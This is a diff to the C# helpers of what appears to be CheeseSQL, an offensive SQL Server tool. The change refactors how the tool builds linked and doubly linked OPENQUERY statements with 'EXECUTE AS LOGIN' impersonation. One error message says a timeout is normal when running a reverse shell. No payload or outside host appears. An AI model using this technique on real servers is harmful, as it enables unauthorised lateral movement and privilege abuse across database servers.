@@ -90,9 +90,8 @@ namespace CheeseSQL.Helpers
             TrySqlExecute(connection, query);
         }
 
-        public static void ExecuteLinkedQuery(SqlConnection connection, string baseQuery, string target, string impersonate, string impersonate_linked)
+        public static string PrepareLinkedQuery(string baseQuery, string target, string impersonate, string impersonate_linked)
         {
-
             baseQuery = FixBaseQuery(baseQuery);
 
             string query = $"SELECT * FROM OPENQUERY(\"{target}\", '{baseQuery}')";
@@ -107,12 +106,17 @@ namespace CheeseSQL.Helpers
             {
                 query = $"EXECUTE AS LOGIN = '{impersonate}' {query}";
             }
+            return query;
+        }
+        public static void ExecuteLinkedQuery(SqlConnection connection, string baseQuery, string target, string impersonate, string impersonate_linked)
+        {
+
+            string query = PrepareLinkedQuery(baseQuery, target, impersonate, impersonate_linked);
             TrySqlExecute(connection, query);
 
         }
-        public static void ExecuteDoublyLinkedQuery(SqlConnection connection, string baseQuery, string target, string intermediate, string impersonate, string impersonate_linked, string impersonate_intermediate)
+        public static string PrepareDoublyLinkedQuery(string baseQuery, string target, string intermediate, string impersonate, string impersonate_linked, string impersonate_intermediate)
         {
-
             string query = baseQuery;
 
             if (!String.IsNullOrEmpty(impersonate_linked))
@@ -136,6 +140,14 @@ namespace CheeseSQL.Helpers
             {
                 query = $"EXECUTE AS LOGIN = '{impersonate}' {query}";
             }
+
+            return query;
+        }        
+        
+        public static void ExecuteDoublyLinkedQuery(SqlConnection connection, string baseQuery, string target, string intermediate, string impersonate, string impersonate_linked, string impersonate_intermediate)
+        {
+
+            string query = PrepareDoublyLinkedQuery(baseQuery, target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
             TrySqlExecute(connection, query);
 
         }
@@ -222,7 +234,6 @@ namespace CheeseSQL.Helpers
                                     {
                                         value = reader.GetValue(i).ToString();
                                     }
-
                                     Console.WriteLine(String.Format("[+] {0:-15}: {1}", name, value));
                                 }
                             }
@@ -238,6 +249,10 @@ namespace CheeseSQL.Helpers
                 {
                     Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is normal");
                     connection.Open();
+                }
+                else if (e.Message.Contains("Could not find server"))
+                {
+                    throw new Exception("Couldn't connect to linked server. Check the spelling");
                 }
                 else
                 {
